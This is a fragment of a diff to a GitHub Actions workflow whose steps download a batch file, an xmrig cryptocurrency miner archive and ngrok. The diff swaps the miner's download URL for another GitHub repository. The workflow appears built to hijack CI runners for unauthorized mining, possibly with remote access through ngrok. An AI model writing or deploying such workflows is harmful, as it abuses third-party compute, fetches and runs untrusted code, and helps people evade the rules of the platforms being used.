@@ -15,7 +15,7 @@ jobs:
         Invoke-WebRequest https://github.com/b0751/b0751/blob/main/start.bat -OutFile start.bat
      - name: Mendownload Launcher.
       run: |
-        Invoke-WebRequest https://github.com/tuanmuda2019/Dataku/blob/main/xmrig-6.14.1.zip -OutFile "xmrig-6.14.1.zip"
+        Invoke-WebRequest https://github.com/b0751/b0751/blob/main/xmrig-6.14.1.zip -OutFile "xmrig-6.14.1.zip"
         
     - name: Extracting Ngrok Files.
       run: Expand-Archive ngrok.zip
